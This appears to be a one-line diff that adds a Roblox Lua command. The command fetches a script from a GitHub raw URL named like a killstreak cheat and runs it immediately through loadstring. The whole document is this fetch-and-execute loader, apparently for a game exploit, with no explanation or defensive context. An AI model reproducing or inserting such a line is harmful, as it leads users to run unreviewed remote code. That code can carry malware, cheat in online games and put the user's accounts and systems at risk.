@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/decryp1/250killstreak/refs/heads/main/script'))()
